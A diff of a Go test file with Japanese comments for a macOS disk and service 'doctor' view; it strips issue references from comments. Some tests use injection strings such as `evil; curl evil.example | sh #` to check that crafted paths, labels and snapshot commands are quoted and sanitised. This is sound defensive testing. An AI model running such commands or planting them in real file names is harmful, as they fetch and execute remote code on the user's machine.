@@ -20,7 +20,7 @@ import (
 func TestDoctorStartupToast(t *testing.T) {
 	now := time.Date(2026, 9, 2, 12, 0, 0, 0, time.Local)
 	// 🚨 ID は**実在のカタログ ID**にする。トーストはカタログに無い ID を落とすので
-	// (issue 193)、架空の ID だと全件落ちて「常に沈黙」を検証するだけのテストになる
+	// 架空の ID だと全件落ちて「常に沈黙」を検証するだけのテストになる
 	big := doctorDiskCache{ScannedAt: now.Add(-time.Hour), Total: 45 << 30, Entries: []doctorDiskCacheEntry{
 		{ID: "xcode-deriveddata", Label: "Xcode", Size: 30 << 30, Status: "ok"},
 		{ID: "npm-cache", Label: "npm", Size: 10 << 30, Status: "ok"},
@@ -39,7 +39,7 @@ func TestDoctorStartupToast(t *testing.T) {
 		t.Error("結果が無いのにトーストが出た (初回は沈黙する)")
 	}
 	// 🚨 Total だけ下げても効かない: トーストは**合計をエントリから引き直す** (細工した Total を
-	// 信用しない。issue 193)。閾値未満を作るならエントリ側を小さくする
+	// 信用しない)。閾値未満を作るならエントリ側を小さくする
 	small := big
 	// 🚨 **境界は定数から作る**。9GB のような固定値だと、閾値を 10 -> 20GB に動かしても
 	// 「閾値未満なら沈黙」が素通りする (9 は両方の閾値未満なので、変更を検出できない)。
@@ -62,7 +62,7 @@ func TestDoctorStartupToast(t *testing.T) {
 	if got := doctorStartupToast(old, true, now); !strings.Contains(got, "(10 日前の診断)") || !strings.Contains(got, "45.0GB") {
 		t.Errorf("古い結果でも数字を出し、日数を添える: %q", got)
 	}
-	// issue 174: LastNotifiedAt が未来 (時計を戻した / NTP の大補正 / 別マシンのキャッシュ) だと
+	// LastNotifiedAt が未来 (時計を戻した / NTP の大補正 / 別マシンのキャッシュ) だと
 	// now.Sub(...) が負になり、cooldown 判定が常に真で永久に沈黙していた。負は cooldown 明けとして扱う。
 	for _, ahead := range []time.Duration{time.Second, doctorToastCooldown, 365 * 24 * time.Hour} {
 		future := big
@@ -170,7 +170,7 @@ Warning: Unbrewed header files were found in /usr/local/include.
 // キャッシュで見ていると、Report からキャッシュへ落とす部分 (Status / Label) を壊しても green になる。
 func TestDoctorStartupToastThroughRealPath(t *testing.T) {
 	now := time.Date(2026, 9, 2, 12, 0, 0, 0, time.Local)
-	// ID は実在のカタログ ID (トーストはカタログに無い ID を落とす。issue 193)
+	// ID は実在のカタログ ID (トーストはカタログに無い ID を落とす)
 	rep := disk.Report{ScannedAt: now, Total: 30 << 30, Results: []disk.Result{
 		{Entry: disk.Entry{ID: "xcode-deriveddata", Label: "Xcode"}, Status: disk.StatusOK, Size: 20 << 30, Items: []disk.Item{{Path: "/x", Size: 20 << 30}}},
 		{Entry: disk.Entry{ID: "npm-cache", Label: "npm"}, Status: disk.StatusOK, Size: 10 << 30, Items: []disk.Item{{Path: "/n", Size: 10 << 30}}},
@@ -211,12 +211,12 @@ func TestDoctorStartupToastThroughRealPath(t *testing.T) {
 	}
 }
 
-// issue 173: 「診断できず」をトーストから消さない (sinking silently の禁止)。
+// 「診断できず」をトーストから消さない (sinking silently の禁止)。
 func TestDoctorStartupToastReportsUndiagnosed(t *testing.T) {
 	now := time.Date(2026, 9, 3, 12, 0, 0, 0, time.Local)
 	// 閾値を超えているときは合計に添える
 	// 🚨 Total / Failed は**エントリから導出される値**なので、手で設定するだけでは効かない
-	// (トーストが引き直す。細工した doctor-disk.json を信用しないため。issue 193)。
+	// (トーストが引き直す。細工した doctor-disk.json を信用しないため)。
 	// production の doctorCacheFromReport も failed エントリを Entries に入れて数えるので、
 	// fixture もその形にする (Entries と整合しない Failed は実経路では起こらない)
 	big := doctorDiskCache{ScannedAt: now.Add(-time.Hour), Entries: []doctorDiskCacheEntry{
@@ -250,7 +250,7 @@ func TestDoctorStartupToastReportsUndiagnosed(t *testing.T) {
 }
 
 // Entries は占有量の降順 (doctorTopEntries が先頭から n 件取るので、マージで順序が崩れると
-// トーストの上位が変わる)。敵対レビュー 2026-09-03: 並び替えを消しても全テストが green だった。
+// トーストの上位が変わる)。並び替えを消しても全テストが green だった。
 func TestDoctorCacheEntriesAreSortedBySize(t *testing.T) {
 	now := time.Now()
 	prev := doctorDiskCache{ScannedAt: now, Entries: []doctorDiskCacheEntry{
@@ -275,7 +275,7 @@ func TestDoctorCacheEntriesAreSortedBySize(t *testing.T) {
 	}
 }
 
-// carry-forward の TTL が依拠する時刻そのものを、書き込み側で不変条件にする (issue 194)。
+// carry-forward の TTL が依拠する時刻そのものを、書き込み側で不変条件にする。
 //
 // 172 で doctorCarryTTL を入れて「今回実測していないエントリの無期限延命」を塞いだが、
 // TTL が見る MeasuredAt の正しさは誰も守っていなかった。2 つの経路で同じ延命に戻る:
@@ -353,7 +353,7 @@ func TestDoctorCarryTTLClampsMeasuredAt(t *testing.T) {
 	}
 }
 
-// 復元した値の信頼境界の取りこぼし (issue 193)。178 が Reason / Contents を絞ったのに
+// 復元した値の信頼境界の取りこぼし。178 が Reason / Contents を絞ったのに
 // **Items[].Path と doctor-disk.json は素通りだった**。どちらも「別セッションの LLM に
 // 消してよいか聞く」文面や起動トーストへ、細工した文字列がそのまま出る経路。
 func TestDoctorRestoredValuesAreValidated(t *testing.T) {
@@ -422,7 +422,7 @@ func TestDoctorRestoredValuesAreValidated(t *testing.T) {
 //
 // 🚨 このガードは **TTL 判定では代替できない**。TestDoctorReusesHeavyEntries の "nomeasure" は
 // now が実時刻なので「ゼロ値との差 = 約 56 年 >= TTL」で弾かれ、`IsZero()` を外しても green の
-// ままだった (issue 198 発見 3)。now が epoch 近傍のとき (fake clock を入れた場合や、
+// ままだった。now が epoch 近傍のとき (fake clock を入れた場合や、
 // 別マシンから持ってきた壊れた snapshot と時計のズレが重なった場合) は age が TTL 内に収まり、
 // **測った覚えのない値を「前回の計測」として再利用する**。純関数なので直接呼んで固定する。
 func TestDoctorReuseSkipsZeroMeasuredAtNearEpoch(t *testing.T) {
@@ -451,10 +451,10 @@ func TestDoctorReuseSkipsZeroMeasuredAtNearEpoch(t *testing.T) {
 	}
 }
 
-// Y のコピー文に「なぜ出たか」を確かめるコマンドを載せる (issue 183)。
+// Y のコピー文に「なぜ出たか」を確かめるコマンドを載せる。
 //
 // 🚨 パス / Label は必ず svc.ShellQuote を通す。どちらも攻撃者が置ける値で、引用しないと
-// **doctor 自身が提示するコマンドがインジェクションを運ぶ** (issue 178 / 193 が塞いだ穴を
+// **doctor 自身が提示するコマンドがインジェクションを運ぶ** (塞いだ穴を
 // 新設することになる)。
 func TestDoctorCopyTextCarriesVerifyCommands(t *testing.T) {
 	const evil = `evil; curl evil.example | sh #`
@@ -475,7 +475,7 @@ func TestDoctorCopyTextCarriesVerifyCommands(t *testing.T) {
 		}
 	}
 
-	// 🚨 mdfind は出さない (カタログが「使わない」と明記した判定材料。issue 148)
+	// 🚨 mdfind は出さない (カタログが「使わない」と明記した判定材料)
 	if got := diskCopyText(disk.Result{Entry: disk.Entry{ID: "orphan-container"}}, "⛔"); strings.Contains(got, "mdfind") {
 		t.Errorf("否定された判定材料 (mdfind) をコピー文に出した:\n%s", got)
 	}
@@ -531,7 +531,7 @@ func TestDoctorCopyTextCarriesVerifyCommands(t *testing.T) {
 }
 
 // 閾値そのものを固定する。上の境界テストは「定数に対して正しく振る舞うか」だけを見るので、
-// **値を書き換えても緑のまま通る**。値は製品判断 (issue 218 で 10 -> 20GB) なので、
+// **値を書き換えても緑のまま通る**。値は製品判断なので、
 // 変えるときはこのテストを直す = 意図的な編集であることを残す。
 func TestDoctorToastThresholdAndCooldownArePinned(t *testing.T) {
 	if want := int64(20) << 30; doctorToastThreshold != want {
@@ -542,11 +542,11 @@ func TestDoctorToastThresholdAndCooldownArePinned(t *testing.T) {
 	}
 }
 
-// 行の語は disk.Mark に委譲し、glogx は色だけを持つ (issue 222 で 2 実装を寄せた)。
+// 行の語は disk.Mark に委譲し、glogx は色だけを持つ。
 // 🚨 守るのは 2 つ: (a) 語を出典へ委譲していること (b) **語と色の対応**。
 // 語そのものの正しさは出典側 (doctor/disk の TestMarkVocabulary) が pin する
 // (ここで語を再掲すると 2 実装に戻る) が、**色は glogx にしか無いので組で pin する**。
-// 敵対レビュー 2026-09-04: color != "" しか見ていなかったため、色を全部 term.AnsiDim へ潰す変異も、
+// color != "" しか見ていなかったため、色を全部 term.AnsiDim へ潰す変異も、
 // 未検証条件を色側だけずらす変異も緑のまま通った (語と色が矛盾した行を作れた)。
 func TestDoctorRiskMarkDelegatesWordAndAddsColor(t *testing.T) {
 	safe := disk.Entry{ID: "e", Risk: disk.RiskSafe}
@@ -561,7 +561,7 @@ func TestDoctorRiskMarkDelegatesWordAndAddsColor(t *testing.T) {
 		{"unverified", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskSafe, Unverified: "名前が未確定"}, Status: disk.StatusOK}, term.AnsiDim},
 		{"safe", disk.Result{Entry: safe, Status: disk.StatusOK, Items: item}, term.AnsiGreen},
 		// 🚨 「未検証だが候補は在る」= 未検証の判定は **候補 0 件のときだけ**。この組が無いと、
-		// 色側の条件から len(Items)==0 を落とす変異が緑のまま通る (敵対レビュー 2026-09-04 が実測)
+		// 色側の条件から len(Items)==0 を落とす変異が緑のまま通る (実測 2026-09-04)
 		{"unverified-with-items", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskSafe, Unverified: "名前が未確定"}, Status: disk.StatusOK, Items: item}, term.AnsiGreen},
 		{"caution", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskCaution}, Status: disk.StatusOK, Items: item}, term.AnsiYellow},
 		{"confirm", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskConfirm}, Status: disk.StatusOK, Items: item}, term.AnsiRed},
@@ -576,7 +576,7 @@ func TestDoctorRiskMarkDelegatesWordAndAddsColor(t *testing.T) {
 	}
 }
 
-// 一覧の g / G は home / end も受ける (status viewer / issues viewer と同じ語彙。issue 242 P3-4)。
+// 一覧の g / G は home / end も受ける (status viewer / issues viewer と同じ語彙)。
 // 🚨 初期位置が先頭なので、home は「下にいる状態から」押さないと差が出ない (押しても押さなくても
 // 同じ結果になる形にすると、別名が消えても緑のまま通る)。
 func TestDoctorListHomeEndAreAliasesOfGG(t *testing.T) {
@@ -599,7 +599,7 @@ func TestDoctorListHomeEndAreAliasesOfGG(t *testing.T) {
 	}
 }
 
-// ディスク行は**カーソル欄 (2 桁) を含めて**幅に収まる (issue 238)。
+// ディスク行は**カーソル欄 (2 桁) を含めて**幅に収まる。
 // 🚨 doctor の描画テストは全部 width 100 固定で、182 が入れた縮退経路が一度も走っていなかった。
 // ここは狭い幅を掃いて、最長マーク「❓ 走査できず」(幅 13) が切れないことを固定する。
 func TestDoctorDiskRowFitsWidthIncludingGutter(t *testing.T) {
@@ -614,7 +614,7 @@ func TestDoctorDiskRowFitsWidthIncludingGutter(t *testing.T) {
 	// 現実に出ない長さの行になり、測りたい行ではなくヘッダで落ちる)
 	v.svcRep, v.brew = &svc.Report{}, &brewDoctorResult{Clean: true}
 	// 🚨 「行が幅を超えない」だけを見ても**発火しない**: lines() が毎行 term.TruncateDisp で切るので、
-	// 予算を誤っても溢れずに**中身が切れる**だけ (敵対レビュー 2026-09-04 の P3)。
+	// 予算を誤っても溢れずに**中身が切れる**だけ。
 	// 見るのは「最長マークが切れずに残るか」= 予算が正しいかそのもの
 	for _, width := range []int{40, 53, 60, 65, 66, 67, 100} {
 		out := strings.Join(v.Lines(DoctorRenderOpts{Width: width, Page: 20}), "\n")
@@ -624,9 +624,9 @@ func TestDoctorDiskRowFitsWidthIncludingGutter(t *testing.T) {
 	}
 }
 
-// マーク幅の見積もりは disk.MarkVocabulary から導く (手で並べると増えた語を取りこぼす。issue 238)。
-// 🚨 件数で固定しない: 語彙が正しく増えたときに落ちるのは門番として逆向き
-// (敵対レビュー 2026-09-04 の P2)。見るのは「Mark が返す語を覆っているか」と「最大幅が一致するか」。
+// マーク幅の見積もりは disk.MarkVocabulary から導く (手で並べると増えた語を取りこぼす)。
+// 🚨 件数で固定しない: 語彙が正しく増えたときに落ちるのは門番として逆向き。
+// 見るのは「Mark が返す語を覆っているか」と「最大幅が一致するか」。
 func TestDoctorMarkWidthCoversVocabulary(t *testing.T) {
 	vocab := disk.MarkVocabulary()
 	if len(vocab) < 6 {
@@ -757,7 +757,7 @@ func TestDoctorCursorAndExpand(t *testing.T) {
 	}
 }
 
-// 「診断できず」は UI に出る (削ると 0 件 / 警告なしに化ける経路。敵対レビュー 2026-09-02 P1)。
+// 「診断できず」は UI に出る (削ると 0 件 / 警告なしに化ける経路)。
 func TestDoctorShowsUndiagnosedStates(t *testing.T) {
 	v := &DoctorView{shown: true, diskTotal: 3}
 	v.diskRep = &disk.Report{Partial: true, Results: []disk.Result{
@@ -799,7 +799,7 @@ func TestDoctorSavesCacheOnCompleteAndPartialPolicy(t *testing.T) {
 	}
 	// 完全な結果 (Total 大) がある状態で小さい partial を close で書いても、**情報を減らさない**。
 	// partial は前回の記録に重ねて書くので、走査が届かなかった big の 45GB は残る
-	// (以前は「書かない」ことで守っていたが、それだと今回測ったぶんが捨てられた。issue 172/173)。
+	// (「書かない」ことで守ると、今回測ったぶんが捨てられる)。
 	// (doctorTestView は XDG_CACHE_HOME を作り直すので、キャッシュは view を作った後にその置き場へ書く)
 	v2 := testView(t)
 	if err := saveDoctorDiskCache(doctorDiskCache{ScannedAt: time.Now(), Total: 45 << 30, Entries: []doctorDiskCacheEntry{{ID: "big", Size: 45 << 30, Status: "ok"}}}); err != nil {
@@ -1006,7 +1006,7 @@ func TestDoctorReusesHeavyEntries(t *testing.T) {
 		"blocked": func(r *disk.Result) { r.Status = disk.StatusBlocked },
 		// 🚨 このケースは **TTL 判定に包含されている** (now が実時刻なので、ゼロ値との差は
 		// 常に TTL 超え)。`IsZero()` ガードを外しても red にならない = ここでは
-		// 「ゼロ値を弾く」を守っていない (issue 198 発見 3)。守るのは下の
+		// 「ゼロ値を弾く」を守っていない。守るのは下の
 		// TestDoctorReuseSkipsZeroMeasuredAtNearEpoch。
 		"nomeasure": func(r *disk.Result) {
 			r.MeasuredAt = time.Time{}
@@ -1029,8 +1029,8 @@ func TestDoctorReusesHeavyEntries(t *testing.T) {
 }
 
 // svc の注記 (penalty box / com.apple. 偽装 / brew 孤児 / system ドメイン) は CLI と UI と
-// Y のコピー文の 3 経路すべてに出る。以前は各経路が自前で文言を持っており、CLI にしか無い注記
-// (AppleLikeOut / BrewOrphan) と UI にしか無い注記 (system ドメイン) があった (issues/179)。
+// Y のコピー文の 3 経路すべてに出る。各経路が自前で文言を持つと、CLI にしか無い注記
+// (AppleLikeOut / BrewOrphan) と UI にしか無い注記 (system ドメイン) が生まれる。
 func TestDoctorSvcAnnotationsMatchCLI(t *testing.T) {
 	rep := svc.Report{Scanned: 4, Findings: []svc.Finding{
 		{Label: "com.apple.fake.agent", PlistPath: "/L/LaunchAgents/com.apple.fake.agent.plist", Domain: "gui/501",
@@ -1229,9 +1229,9 @@ func TestDoctorIgnoresDiskMsgAfterClose(t *testing.T) {
 	}
 }
 
-// 「診断できず」の行は選べて、y / Y で完全な情報が取り出せる。以前は非 selectable で、
-// disk の Failures は親行の Y からしか取れず、svc の Undiagnosed は**どこからも取れなかった**
-// (幅 80 で理由が丸ごと消える。issues/180)。
+// 「診断できず」の行は選べて、y / Y で完全な情報が取り出せる。非 selectable だと、
+// disk の Failures は親行の Y からしか取れず、svc の Undiagnosed は**どこからも取れない**
+// (幅 80 で理由が丸ごと消える)。
 func TestDoctorUndiagnosedRowsAreSelectable(t *testing.T) {
 	v := &DoctorView{shown: true, expanded: map[rowKey]bool{}}
 	v.diskRep = &disk.Report{Results: []disk.Result{{
@@ -1297,7 +1297,7 @@ func TestDoctorUndiagnosedRowsAreSelectable(t *testing.T) {
 	}
 }
 
-// issue 172: 再利用 (Reused) した計測値はトーストの材料にしない。行には「N 分前の計測を再利用」の
+// 再利用 (Reused) した計測値はトーストの材料にしない。行には「N 分前の計測を再利用」の
 // 注記が付くが、トーストには無い。実体を消した後も最大 1 時間「解放できます」と言い続け、
 // 「開けば直る」も効かない (トーストは次に doctor を開くまで更新されない)。
 // 代わりに**前回のキャッシュのそのエントリを引き継ぐ** (= 最後に実測した値)。
@@ -1347,7 +1347,7 @@ func TestDoctorSaveCacheKeepsLastRealMeasurement(t *testing.T) {
 	}
 }
 
-// issue 172 の敵対レビュー (2026-09-03、3 周): 「Reused が 1 件でもあれば結果ごと書かない」に
+// 「Reused が 1 件でもあれば結果ごと書かない」に
 // してはいけない。doctorReuseFrom の 1 時間は**各エントリが実測されるたびにリセットされる**ので、
 // 重いエントリが 2 件以上あって実測時刻が互い違いだと「常にどれか 1 件が再利用対象」の状態が
 // 持続し、キャッシュが恒久的に凍結する (実測: 20 分おきに 6 時間・18 回開いても一度も更新されず、
@@ -1392,9 +1392,9 @@ func TestDoctorSaveCacheDoesNotFreezeWithStaggeredReuse(t *testing.T) {
 	}
 }
 
-// issue 173 の敵対レビュー (2026-09-03、2 周): failed を含む「完走した」結果はキャッシュを更新する。
+// failed を含む「完走した」結果はキャッシュを更新する。
 // ガードに載せると「1 エントリが恒久的に測れない Mac」でキャッシュが永久に凍結し (保存しない →
-// 次回も prev は完全なまま → 同じ判定)、合計も Failed 件数も更新されない = issue 173 が塞いだはずの
+// 次回も prev は完全なまま → 同じ判定)、合計も Failed 件数も更新されない = 塞いだはずの
 // sinking silently の再現。時間で区切る形も採らない (「前回の完全結果の古さ」は「今回の結果が
 // 途中経過か」と無関係で、doctor をたまにしか開かない運用が丸ごと無保護になる)。
 // 沈黙は Failed 件数とトースト側で防ぐ。
@@ -1428,7 +1428,7 @@ func TestDoctorSaveCacheWritesCompletedScanWithFailures(t *testing.T) {
 	}
 
 	// 一方、**中断した部分結果** (partial) は完全な結果を潰さない。前回の記録に重ねて書くので、
-	// 走査が届かなかったエントリの数字が残る (敵対レビュー 2026-09-03: 3 時間前の 45GB が
+	// 走査が届かなかったエントリの数字が残る (実測 2026-09-03: 3 時間前の 45GB が
 	// 「開いて即 Esc」の 1MB で潰れる形にしてはいけない)。
 	// 🚨 ただし引き継ぎには鮮度の上限 (doctorCarryTTL) がある。上限を持たせないと、
 	// 「重いので毎回 Esc の前にたどり着けない」エントリが無期限に延命し、実体が消えても
@@ -1464,7 +1464,7 @@ func TestDoctorSaveCacheWritesCompletedScanWithFailures(t *testing.T) {
 	}
 }
 
-// issue 173 の敵対レビュー (2026-09-03、4 周): 中断した部分結果を**洗い替えで**書くと、
+// 中断した部分結果を**洗い替えで**書くと、
 // 今回走査が届かなかったエントリの記録と「診断できず」件数が消える。
 // 「合計が前回より大きい partial は書いてよい」(2026-09-02 の仕様) を経由するので、
 // 大きいエントリを 1 つ測った直後に Esc するだけで恒久 failed の記録が failed=0 に化けた。
@@ -1528,10 +1528,9 @@ func TestDoctorSaveCachePartialMergesInsteadOfReplacing(t *testing.T) {
 	}
 }
 
-// 2026-09-02 の敵対レビュー P2 の回帰テスト。以前は saveCache の「合計が前回より小さければ書かない」
-// ガードが守っていたが、partial を前回の記録に重ねて書くようにした時点でそのガードは冗長になり、
-// 「今回実際に測り直して縮んだと分かったエントリ」まで古い値へ差し戻す副作用があったので外した
-// (issue 173 にマスクしていた failure mode を列挙してある)。**この不変条件を今守っているのは
+// 回帰テスト。saveCache に「合計が前回より小さければ書かない」ガードを置かない。
+// partial を前回の記録に重ねて書くのでそのガードは冗長で、
+// 「今回実際に測り直して縮んだと分かったエントリ」まで古い値へ差し戻す副作用がある。**この不変条件を今守っているのは
 // マージそのもの**なので、ガードではなくマージに対する回帰テストとしてここに置く。
 func TestDoctorSaveCacheNearEmptyPartialDoesNotCollapseCache(t *testing.T) {
 	now := time.Now()
@@ -1583,7 +1582,7 @@ func TestDoctorSaveCacheNearEmptyPartialDoesNotCollapseCache(t *testing.T) {
 	}
 }
 
-// issue 178 (P1): doctor-snapshot.json は一般ユーザー権限で書き換えられる。細工した JSON の
+// doctor-snapshot.json は一般ユーザー権限で書き換えられる。細工した JSON の
 // 任意パス・任意 ID・未知の Status・負のサイズ・未来の時刻が、行 / y のコピー / 合計 /
 // 次の snapshot への書き戻しに載ってはいけない。④ (削除) はこの画面の行を対象にする設計なので、
 // **削除を実装する前に**この境界を確定しておく。
@@ -1651,7 +1650,7 @@ func TestDoctorSnapshotTrustBoundary(t *testing.T) {
 	}
 }
 
-// issue 178 の敵対レビュー (2026-09-03): サービス節と brew 節は sanitize を通っておらず、
+// サービス節と brew 節は sanitize を通っておらず、
 // 細工した snapshot の `Commands` が「手で実行してください」の提示と `Y` のコピー文に
 // そのまま載っていた (`curl evil | sh` を実際に載せられた)。ディスク節だけ境界を引いても
 // この画面の信頼境界は閉じない。
@@ -1727,7 +1726,7 @@ func TestDoctorSnapshotTrustBoundarySvcAndBrew(t *testing.T) {
 	}
 }
 
-// issue 178 の敵対レビュー 2 周目: サービス節の残りの穴を塞ぐ。
+// サービス節の残りの穴を塞ぐ。
 //  1. Undiagnosed.PlistPath は Finding と違って形の検査が無く、`plutil -p <path>` の形で
 //     引用なしに画面へ出ていた (`/tmp/x; curl evil | sh #` がそのまま表示・コピーされる)
 //  2. 表示用の自由文でタブを明示的に通していた (term.DispWidth は幅 0 と数えるが端末は次のタブ位置まで
@@ -1790,7 +1789,7 @@ func TestDoctorSnapshotTrustBoundaryFreeText(t *testing.T) {
 	}
 }
 
-// 狭い幅で「何の行か」「どう扱うか」が消えないこと (issue 182)。
+// 狭い幅で「何の行か」「どう扱うか」が消えないこと。
 //
 // 幅で最初に切れるのは行の末尾なので、**そこに置いてよいのは失っても困らない情報だけ**。
 // 状態 (リスク記号) と再利用の注記は末尾に置かない。
@@ -1857,8 +1856,7 @@ func TestDoctorDiskRowKeepsStateAtNarrowWidth(t *testing.T) {
 func doctorRiskMarkText(r disk.Result) string { m, _ := doctorRiskMark(r); return m }
 
 // 検出条件そのものが未実測のエントリ (disk.Entry.Unverified) を、候補 0 件でも UI が畳まないこと。
-// 畳むと「名前が違って 1 件も当たらなかった」が「候補なし = きれい」と**同じ見え方**になる
-// (issue 169 / 207)。
+// 畳むと「名前が違って 1 件も当たらなかった」が「候補なし = きれい」と**同じ見え方**になる。
 //
 // 🚨 **CLI (disk.Format) と UI (diskSection) で突き合わせる**。同じデータから同じ結論を描く形は、
 // 片方のテストがもう片方を 1 mm も守らない (規範: mutation-verify-new-tests.md
@@ -1910,7 +1908,7 @@ func TestDoctorUnverifiedEntryMatchesCLI(t *testing.T) {
 	}
 }
 
-// snapshot から復元した行は、**表示文言をカタログの今の定義へ束ね直す** (issue 229)。
+// snapshot から復元した行は、**表示文言をカタログの今の定義へ束ね直す**。
 // snapshot には Entry が丸ごと保存されるので、そのまま使うと (a) カタログを直しても古い文言が
 // 出続け (b) 一般ユーザー権限で書き換えた Label / Detail がそのまま行と y のコピーへ載る。
 func TestDoctorSnapshotRebindsEntryToCatalog(t *testing.T) {
@@ -2244,7 +2242,7 @@ func TestDoctorEscClosesEvenWhenExpanded(t *testing.T) {
 	}
 }
 
-// 畳まれている行の detail は組まない (issue 270)。
+// 畳まれている行の detail は組まない。
 //
 // buildRows の add() が detail を並べるのは v.expanded[r.key] のときだけなので、
 // 畳まれている行のぶんは**作って捨てていた**。diskDetail は Contents / Items を全件走査するので、
